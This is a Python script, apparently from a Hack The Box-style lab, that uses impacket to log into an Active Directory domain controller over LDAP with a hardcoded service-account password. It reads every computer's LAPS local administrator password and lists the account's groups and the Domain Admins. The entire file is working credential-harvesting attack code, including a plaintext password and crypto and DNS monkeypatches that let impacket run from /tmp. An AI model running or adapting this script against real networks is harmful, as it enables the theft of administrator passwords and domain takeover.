#!/usr/bin/env python3
"""Read LAPS passwords using svc_laps credentials"""
import sys, os

sys.path.insert(0, '/tmp/pyasn1.whl')
sys.path.insert(0, '/tmp/pyasn1m.whl')
sys.path.insert(0, '/tmp/impacket.whl')

import Crypto
sys.modules['Cryptodome'] = Crypto
import Crypto.Cipher, Crypto.Hash, Crypto.Protocol, Crypto.PublicKey, Crypto.Random, Crypto.Signature, Crypto.Util
for mod in ['Cipher','Hash','Protocol','PublicKey','Random','Signature','Util']:
    sys.modules[f'Cryptodome.{mod}'] = getattr(Crypto, mod)

import Crypto.Hash.HMAC as _hmac_mod
_orig = _hmac_mod.new
def _p(key, msg=None, digestmod=None):
    if isinstance(key, (bytearray, memoryview)): key = bytes(key)
    if isinstance(msg, (bytearray, memoryview)): msg = bytes(msg)
    return _orig(key, msg, digestmod) if digestmod else _orig(key, msg)
_hmac_mod.new = _p

import Crypto.Cipher.ARC4 as _arc4
_arc4_orig = _arc4.new
def _arc4_p(key):
    if isinstance(key, (bytearray, memoryview)): key = bytes(key)
    return _arc4_orig(key)
_arc4.new = _arc4_p

import socket
DC_IP = '172.16.1.1'
DC_FQDN = 'openAD.king.htb'

_orig_getaddrinfo = socket.getaddrinfo
def _patched(host, *args, **kwargs):
    if host and str(host).lower() in (DC_FQDN.lower(), 'openad'):
        host = DC_IP
    return _orig_getaddrinfo(host, *args, **kwargs)
socket.getaddrinfo = _patched

from impacket.ldap import ldap, ldapasn1

USERNAME = 'svc_laps'
PASSWORD = '16bmxkingm@'
DOMAIN = 'KING.HTB'

print(f"[*] Connecting to LDAP as {USERNAME}@{DOMAIN}")

try:
    ldap_conn = ldap.LDAPConnection(f'ldap://{DC_FQDN}', 'dc=king,dc=htb', DC_IP)
    ldap_conn.login(USERNAME, PASSWORD, DOMAIN, '', '')
    print("[+] LDAP login successful (NTLM/simple)!")

    # Read LAPS passwords
    print("\n[*] Reading LAPS passwords (ms-Mcs-AdmPwd)...")
    result = ldap_conn.search(
        searchFilter='(objectClass=computer)',
        attributes=['sAMAccountName', 'ms-Mcs-AdmPwd', 'ms-Mcs-AdmPwdExpirationTime', 'dNSHostName'],
        sizeLimit=50
    )
    for entry in result:
        if isinstance(entry, ldapasn1.SearchResultEntry):
            sam = None
            laps_pwd = None
            dns = None
            for attr in entry['attributes']:
                n = attr['type'].asOctets().decode('utf-8', errors='ignore').lower()
                vals = [str(v) for v in attr['vals']]
                if n == 'samaccountname': sam = vals[0]
                elif n == 'ms-mcs-admpwd': laps_pwd = vals[0]
                elif n == 'dnshostname': dns = vals[0]
            if sam:
                print(f"  Computer: {sam} | DNS: {dns}")
                if laps_pwd:
                    print(f"  [!!!] LAPS PASSWORD: {laps_pwd}")

    # Also check svc_laps group memberships
    print("\n[*] svc_laps group memberships:")
    result2 = ldap_conn.search(
        searchFilter='(sAMAccountName=svc_laps)',
        attributes=['memberOf', 'adminCount', 'distinguishedName'],
        sizeLimit=5
    )
    for entry in result2:
        if isinstance(entry, ldapasn1.SearchResultEntry):
            for attr in entry['attributes']:
                n = attr['type'].asOctets().decode('utf-8', errors='ignore')
                print(f"  {n}: {[str(v) for v in attr['vals']]}")

    # Check for Domain Admins and admin accounts
    print("\n[*] Domain Admins:")
    result3 = ldap_conn.search(
        searchFilter='(memberOf=CN=Domain Admins,CN=Users,DC=king,DC=htb)',
        attributes=['sAMAccountName'],
        sizeLimit=20
    )
    for entry in result3:
        if isinstance(entry, ldapasn1.SearchResultEntry):
            for attr in entry['attributes']:
                if attr['type'].asOctets().decode().lower() == 'samaccountname':
                    print(f"  {[str(v) for v in attr['vals']]}")

except Exception as e:
    print(f"[-] Error: {e}")
    import traceback; traceback.print_exc()
